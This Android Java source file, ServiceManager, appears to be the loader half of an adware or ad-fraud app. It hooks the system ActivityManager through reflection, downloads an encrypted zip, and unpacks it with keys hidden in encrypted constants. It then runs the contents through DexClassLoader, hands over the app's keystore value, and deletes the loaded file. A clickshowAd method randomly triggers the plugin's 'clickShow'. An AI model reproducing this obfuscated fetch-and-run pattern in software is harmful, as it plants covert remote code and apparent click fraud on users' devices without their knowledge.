package com.xxm.dex;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.res.Resources;
import android.util.Log;

import com.xxm.dex.Utils.AnswersUtil;
import com.xxm.dex.Utils.DUtil;
import com.xxm.dex.Utils.H_encode;
import com.xxm.dex.Utils.UzipProgress;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import dalvik.system.DexClassLoader;

import static com.xxm.dex.Utils.DUtil.DEXFILE;
import static com.xxm.dex.Utils.DUtil.DEXOUTPUTDIR;
import static com.xxm.dex.Utils.DUtil.KEY;
import static com.xxm.dex.Utils.DUtil.SOPATH;
import static com.xxm.dex.Utils.DUtil.UNZIPFILE;
import static com.xxm.dex.Utils.DUtil.UZIPKEY;
import static com.xxm.dex.Utils.DUtil.ZIPFILE;

/**
 * Created by admin on 2017/8/18.
 */
public class ServiceManager {
    private static final String KEY_ORIGINAL_INTENT = "original_intent";
    //com.plugin.sub
    public static final String PLUG_SERVICE_PKG = "RiOjfZ+OheO55/P9uMnlog==";
    //com.plugin.sub.services.AService
    public static final String PLUG_SERVICE_NAME = "EVOH6tlg7OuYexoT3Ubq+hakoZ64ISPZJNPDhFRmRsrANte+BVJM4ZsciXqkDNVz";

    //    //com.oom.sublib
    //    public static final String PLUG_SERVICE_PKG = "iIdkk4Z/kdbhAjzVr8k/bQ==";
    //    //com.oom.sublib.view.AgentService
    //    public static final String PLUG_SERVICE_NAME = "jy63LXdrmyJuyMkHxibPo/UnAAgxrlnIlqKiUvnabCnANte+BVJM4ZsciXqkDNVz";


    private Context mContext;
    private static final String TAG = "Welog";
    //保存所有存活的插件Service实例。
    private Map<ComponentName, Service> mAliveServices = new HashMap<>();
    //保存从插件中加载的Service信息。
    private Map<ComponentName, Class> mLoadedServices = new HashMap<>();
    //占坑的Service信息。
    private ComponentName mStubComponentName;

    public PackageInfo getPluginPackageArchiveInfo() {
        return pluginPackageArchiveInfo;
    }

    private PackageInfo pluginPackageArchiveInfo;

    private Resources pluginResources;

    public Resources getPluginResources() {
        return pluginResources;
    }

    public DexClassLoader getLoader() {
        return loader;
    }

    private Class<?> serviceClass;

    private DexClassLoader loader;

    public static ServiceManager getInstance() {
        return Holder.INSTANCE;
    }

    private static class Holder {
        private static final ServiceManager INSTANCE = new ServiceManager();
    }

    public void setup(Context context) {
        this.mContext = context;
        try {
            //1.通过反射获取到ActivityManagerNative类。
            Class<?> activityManagerNativeClass = Class.forName("android.app.ActivityManagerNative");
            Field gDefaultField = activityManagerNativeClass.getDeclaredField("gDefault");
            gDefaultField.setAccessible(true);
            Object gDefault = gDefaultField.get(activityManagerNativeClass);
            //2.获取mInstance变量。
            Class<?> singleton = Class.forName("android.util.Singleton");
            Field instanceField = singleton.getDeclaredField("mInstance");
            instanceField.setAccessible(true);
            //3.获取原始的对象。
            Object original = instanceField.get(gDefault);
            //4.动态代理，用于拦截Intent。
            Class<?> iActivityManager = Class.forName("android.app.IActivityManager");
            Object proxy = Proxy.newProxyInstance(context.getClassLoader(), new Class[]{iActivityManager}, new IActivityManagerInvocationHandler(original));
            instanceField.set(gDefault, proxy);
            //5.读取插件当中的Service。
            loadService(context);
            //6.占坑的Component。
            mStubComponentName = new ComponentName(context, StubService.class.getName());
        } catch (Exception e) {
            e.printStackTrace();
            Log.i(TAG, "setup: error:" + e.getMessage());
        }
    }

    //
    public void onStartCommand(Intent intent, int flags, int startId) {
        Intent matchIntent = intent.getParcelableExtra(KEY_ORIGINAL_INTENT);
        ComponentName componentName = matchIntent.getComponent();
        Class loadServiceInfo = mLoadedServices.get(componentName);
        if (loadServiceInfo != null) {
            Service realService = mAliveServices.get(componentName);
            if (realService == null) {
                //创建插件Service的实例。
                realService = createService(loadServiceInfo);
                if (realService != null) {
                    //调用它的onCreate()方法。
                    realService.onCreate();
                    mAliveServices.put(matchIntent.getComponent(), realService);
                }
            }
            if (realService != null) {
                realService.onStartCommand(matchIntent, flags, startId);
            }
        }
    }

    private boolean onStopService(Intent intent) {
        ComponentName component = intent.getComponent();
        if (component != null) {
            Service service = mAliveServices.get(component);
            if (service != null) {
                service.onDestroy();
            }
            mAliveServices.remove(component);
        }
        return mAliveServices.isEmpty();
    }

    public void onDestroy() {
        for (Service aliveService : mAliveServices.values()) {
            aliveService.onDestroy();
        }
    }

    private void loadService(Context context) {
        File soPath = null;
        DUtil dUtil = null;
        try {
            dUtil = DUtil.getInstance(context);
            Log.i(TAG, "loadService: ");
            //从插件中加载Service类。
            File dexOutputDir = context.getDir(H_encode.decrypt(DEXOUTPUTDIR, KEY), 0);
            if (dexOutputDir.exists()) {
                Log.i(TAG, "dex下文件");
            }
            File dexfile = new File(dexOutputDir.getAbsolutePath(), H_encode.decrypt(DEXFILE, KEY));

            Log.i(TAG, "动态加载文件路径 " + dexfile.getAbsolutePath());

            if (dexfile.exists()) {
                Log.i(TAG, "删除 " + dexfile.getAbsolutePath() + "下文件");
                dexfile.delete();
            }
            String SDPath = context.getFilesDir().getAbsolutePath();
            //                        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

            File unzipFile = new File(SDPath, H_encode.decrypt(UNZIPFILE, KEY));

            if (!unzipFile.exists()) {
                unzipFile.mkdirs();
            }

            File zipFile = new File(SDPath, H_encode.decrypt(ZIPFILE, KEY));

            if (DUtil.checkNet(context)) {

                Log.i(TAG, "网络正常:下载 ");

                if (DUtil.getInstance(context).deleteFile(zipFile)) {

                    if (dUtil.getD_status() != DUtil.DOWNLOAD_STATU_ING) {

                        AnswersUtil.statistic(mContext, "download_plugin");

                        DUtil.getInstance(context).startDownload(zipFile);

                        return;
                    }
                }
            } else {
                Log.i(TAG, "网络异常:不下载下载 ");
                AnswersUtil.statistic(mContext, "netError_not_download");
                //文件不存在的时候直接返回
                if (!zipFile.exists()) {
                    return;
                }
            }

            if (dUtil.getD_status() == DUtil.DOWNLOAD_STATU_ING) {

                return;
            }

            UzipProgress.Unzip(zipFile.getAbsoluteFile(), unzipFile.getAbsolutePath(), H_encode.decrypt(UZIPKEY, KEY), null);

            soPath = new File(SDPath, H_encode.decrypt(SOPATH, KEY));

            if (soPath.exists()) {

                Log.i(TAG, "加载类");
            }
            Log.i(TAG, "apkPath: " + soPath.getAbsolutePath());

            loader = new DexClassLoader(soPath.getAbsolutePath(), dexOutputDir.getAbsolutePath(), null, context.getClassLoader());

            serviceClass = loader.loadClass(H_encode.decrypt(PLUG_SERVICE_NAME, DUtil.KEY));

            Object owner = serviceClass.newInstance();

            //Context cid
            Method m = serviceClass.getMethod("setContext", Context.class, String.class);
            //针对private
            m.setAccessible(true);

            String keyStore = DUtil.getKeyStore(context);

            Log.i(TAG, "keyStore: " + keyStore);

            m.invoke(owner, context, keyStore);


            mLoadedServices.put(new ComponentName(H_encode.decrypt(PLUG_SERVICE_PKG, DUtil.KEY), H_encode.decrypt(PLUG_SERVICE_NAME, DUtil.KEY)), serviceClass);

        } catch (Exception e) {

            if (dUtil != null && dUtil.getD_status() != DUtil.DOWNLOAD_STATU_ING) {
                AnswersUtil.statistic(mContext, "load_error", e.getMessage());
                Log.i(TAG, "loadService: error:" + e.getMessage());
            } else {
                Log.i(TAG, "loadService: 正在下载 不统计load错误");
            }

            e.printStackTrace();
        } finally {
            if (soPath != null) {
                if (soPath.exists()) {
                    soPath.delete();
                }
            }
        }
    }


    public void clickshowAd(Context context) {
        clickshowAd(context, -1);
    }

    /**
     * level<0 do always
     * level>10 do nothing
     * 0<=level<10
     *
     * @param context
     */
    public void clickshowAd(Context context, int level) {

        Log.i(TAG, "clickshowAd: ");

        int ran = new Random().nextInt(10);

        Log.i(TAG, "小于" + level + "不执行: random:" + ran);

        if (ran < level) {
            return;
        }

        //setup(context);
        if (serviceClass != null) {
            Method m = null;
            try {
                Object owner = serviceClass.newInstance();
                m = serviceClass.getMethod("clickShow", Context.class);
                m.setAccessible(true);
                m.invoke(owner, context);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            setup(context);
        }
    }

    //
    private Service createService(Class clz) {
        Service service = null;
        try {
            //1.实例化service。
            service = (Service) clz.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return service;
    }

    //
    private ComponentName getStubComponentName() {
        return mStubComponentName;
    }

    public boolean isPlugService(ComponentName componentName) {
        return componentName != null && mLoadedServices.containsKey(componentName);
    }

    private class IActivityManagerInvocationHandler implements InvocationHandler {
        private Object mOriginal;

        public IActivityManagerInvocationHandler(Object original) {
            mOriginal = original;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            String methodName = method.getName();
            switch (methodName) {
                case "startService":
                    Intent matchIntent = null;
                    int matchIndex = 0;
                    for (Object object : args) {
                        if (object instanceof Intent) {
                            matchIntent = (Intent) object;
                            break;
                        }
                        matchIndex++;
                    }
                    if (matchIntent != null && ServiceManager.getInstance().isPlugService(matchIntent.getComponent())) {
                        Intent stubIntent = new Intent(matchIntent);
                        stubIntent.setComponent(getStubComponentName());
                        stubIntent.putExtra(KEY_ORIGINAL_INTENT, matchIntent);
                        //将插件的Service替换成占坑的Service。
                        args[matchIndex] = stubIntent;
                    }
                    break;
                case "stopService":
                    Intent stubIntent = null;
                    int stubIndex = 0;
                    for (Object object : args) {
                        if (object instanceof Intent) {
                            stubIntent = (Intent) object;
                            break;
                        }
                        stubIndex++;
                    }
                    if (stubIntent != null) {
                        boolean destroy = onStopService(stubIntent);
                        if (destroy) {
                            //如果需要销毁占坑的Service，那么就替换掉Intent进行处理。
                            Intent destroyIntent = new Intent(stubIntent);
                            destroyIntent.setComponent(getStubComponentName());
                            args[stubIndex] = destroyIntent;
                        } else {
                            //由于在onStopService中已经手动调用了onDestroy，因此这里什么也不需要做，直接返回就可以。
                            return null;
                        }
                    }
                    break;
                default:
                    break;
            }
            Log.d("ServiceManager", "call invoke, methodName=" + method.getName());
            return method.invoke(mOriginal, args);
        }
    }
}
